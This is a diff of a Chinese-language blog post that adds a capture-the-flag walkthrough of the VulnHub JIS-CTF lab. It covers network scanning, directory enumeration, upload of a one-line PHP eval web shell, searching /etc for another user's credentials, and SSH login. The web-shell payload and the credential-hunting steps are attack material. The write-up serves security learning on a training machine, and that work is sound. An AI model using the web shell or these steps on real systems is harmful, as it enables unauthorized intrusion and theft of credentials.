@@ -7,17 +7,33 @@
   
   <title>vulnhub靶机学习记录 | blog小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="JIS-CTF">
+  <meta name="description" content="JIS-CTF  introduce Penetration testing">
 <meta property="og:type" content="article">
 <meta property="og:title" content="vulnhub靶机学习记录">
-<meta property="og:url" content="https://my011215.github.io/2023/05/04/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:url" content="https://my011215.github.io/2023/05/05/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="blog小窝">
-<meta property="og:description" content="JIS-CTF">
+<meta property="og:description" content="JIS-CTF  introduce Penetration testing">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-05-04T08:30:30.000Z">
-<meta property="article:modified_time" content="2023-05-04T08:20:33.439Z">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/375.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/376.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/377.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/378.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/379.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/380.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/381.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/382.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/383.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/384.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/385.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/386.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/387.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/388.png?raw=true">
+<meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/389.png?raw=true">
+<meta property="article:published_time" content="2023-05-05T03:30:30.000Z">
+<meta property="article:modified_time" content="2023-05-05T06:19:21.149Z">
 <meta property="article:author" content="草莓布丁">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/375.png?raw=true">
   
     <link rel="alternate" href="/atom.xml" title="blog小窝" type="application/atom+xml">
   
@@ -74,8 +90,8 @@
       <div class="outer">
         <section id="main"><article id="post-Penetration testing/vulnhub靶机学习记录" class="article article-type-post" itemscope itemprop="blogPost"> 
 <div class="article-meta">
-    <a href="/2023/05/04/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="article-date">
-  <time datetime="2023-05-04T08:30:30.000Z" itemprop="datePublished">2023-05-04</time>
+    <a href="/2023/05/05/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="article-date">
+  <time datetime="2023-05-05T03:30:30.000Z" itemprop="datePublished">2023-05-05</time>
 </a>
 
 
@@ -102,16 +118,145 @@
       
         <!-- toc -->
 <ul>
-<li><a href="#jis-ctf">JIS-CTF</a></li>
+<li><a href="#jis-ctf">JIS-CTF</a>
+<ul>
+<li><a href="#introduce">introduce</a></li>
+<li><a href="#penetration-testing">Penetration testing</a></li>
+</ul>
+</li>
 </ul>
 <!-- tocstop -->
 <span id="more"></span>  
 <h2><span id="jis-ctf"> JIS-CTF</span></h2>
+<h3><span id="introduce"> introduce</span></h3>
+<p>主要的漏洞是任意文件上传，同时结合渗透测试和 ctf 的相关知识去获取一共 5 个 flag。<br>
+下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/">https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/</a></p>
+<ul>
+<li>
+<p>flag1<br>
+ 目录扫描，在可见 flag 文件里</p>
+</li>
+<li>
+<p>flag2<br>
+ 目录扫描，在有提示的可以目录源代码中。有点 ctf 味道，实际渗透也可以思索前端信息利用。</p>
+</li>
+<li>
+<p>flag3<br>
+ 任意文件上传，蚁剑连接，在相关文件中查找到隐藏 flag</p>
+</li>
+<li>
+<p>flag4<br>
+ 查找相关文件可以获取到其他用户信息密码</p>
+</li>
+<li>
+<p>flag5<br>
+ 使用其他用户信息和密码进行暴露的 ssh 端口连接</p>
+</li>
+</ul>
+<h3><span id="penetration-testing"> Penetration testing</span></h3>
+<ol>
+<li>信息收集</li>
+</ol>
+<ul>
+<li>查找网卡当前设备<br>
+获取到目标主机 ip</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/375.png?raw=true" alt><br>
+ip 大概率是 192.168.21.138</p>
+<ul>
+<li>namp 扫描<br>
+对目标进行 ping 检测，不进行端口扫描（会发送四种报文确定目标是否存活，）</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.21.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/376.png?raw=true" alt><br>
+对端口上的服务程序版本进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.21.138</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/377.png?raw=true" alt></p>
+<ul>
+<li>
+<p>80 端口查看<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/378.png?raw=true" alt></p>
+</li>
+<li>
+<p>目录扫描</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.21.138</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/379.png?raw=true" alt></p>
+<ul>
+<li>
+<p>查看相关目录结构信息<br>
+ get flag1<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/380.png?raw=true" alt><br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/381.png?raw=true" alt></p>
+</li>
+<li>
+<p>总结可以路径，获取更大探索目标</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">可疑路径</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /backup</span><br><span class="line">Disallow: /admin</span><br><span class="line">Disallow: /admin_area</span><br><span class="line">Disallow: /r00t</span><br><span class="line">Disallow: /uploads</span><br><span class="line">Disallow: /uploaded_files</span><br><span class="line">Disallow: /flag</span><br><span class="line">/assets</span><br><span class="line">/css</span><br><span class="line">/js</span><br><span class="line">/server-status</span><br><span class="line">/admin_area/index.php</span><br></pre></td></tr></table></figure>
+<p>get flag2<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/382.png?raw=true" alt></p>
+<ul>
+<li>得到登录账号信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--	username : admin</span><br><span class="line">	password : 3v1l_H@ck3r</span><br><span class="line">	The 2nd flag is : &#123;7412574125871236547895214&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>发掘漏洞<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/383.png?raw=true" alt><br>
+文件上传咩，试一试 php 文件能传不</li>
+</ol>
+<ul>
+<li>1.php</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($POST_[&#x27;cmd&#x27;]) ?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://github.com/my011215/my011215.github.io/blob/main/image/384.png?raw=true" alt></p>
+<ul>
+<li>获取文件上传路径<br>
+翻了一波，在上面敏感路径拼凑得到<br>
+ /uploaded_files/1.php<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/385.png?raw=true" alt></li>
+</ul>
+<ol start="3">
+<li>漏洞利用</li>
+</ol>
+<ul>
+<li>蚁剑连接后门，查看网站内部文件<br>
+ get flag3<br>
+hint.txt<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/386.png?raw=true" alt></li>
+</ul>
+<p>提示让我们获取另外一个账号去读取 flag.txt 文件，之前也读过 flag.txt 文件，发现权限不够，读取不了。</p>
+<ul>
+<li>查找用户名<br>
+这个操作系统环境搭建的时候是 Linux，之前阅读过相关文章了解到用户名和密码会存储在 /etc/passwd/ 或者 /etc/shadow/<br>
+ 一般是在第二个路径，第一个路径不会显示完全<br>
+但是呢，我读取失败了，看到网站这么多文件，我总不能一个一个翻吧。<br>
+于是乎，我打开了蚁剑的虚拟终端，使用 shell 命令查找相关文件</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -sr technawi /etc/</span><br></pre></td></tr></table></figure>
+<p>不显示错误信息查找子目录和 technawi 有关的文件<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/387.png?raw=true" alt><br>
+非常好，范围缩小了很多<br>
+ get flag4<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/388.png?raw=true" alt></p>
+<ul>
+<li>ssh 连接<br>
+之前也尝试过用 admin 密码进行 ssh 连接，但是都被拒绝了。<br>
+后门也尝试使用 technawi 进行登录框登录，但是没有获取其他有用信息。<br>
+get flag5<br>
+<img src="https://github.com/my011215/my011215.github.io/blob/main/image/389.png?raw=true" alt></li>
+</ul>
+<ol start="4">
+<li>总结<br>
+这个靶场属于简单的类型，主要就是任意文件上传加上一个 ssh 远程连接。其他主要考察信息利用，感觉多刷还是可以的，有感觉，自然而然拓宽了渗透思路和打法。这种感觉比打 ctf 更清晰命令，还是比较适合渗透小白的我练习！</li>
+</ol>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://my011215.github.io/2023/05/04/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" data-id="clh8uy1qx0000l4tn74tu6soz" class="article-share-link">Share</a>
+      <a data-url="https://my011215.github.io/2023/05/05/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" data-id="clh8uy1qx0000l4tn74tu6soz" class="article-share-link">Share</a>
       
       
     </footer>
@@ -168,7 +313,7 @@
       <ul>
         
           <li>
-            <a href="/2023/05/04/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">vulnhub靶机学习记录</a>
+            <a href="/2023/05/05/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">vulnhub靶机学习记录</a>
           </li>
         
           <li>
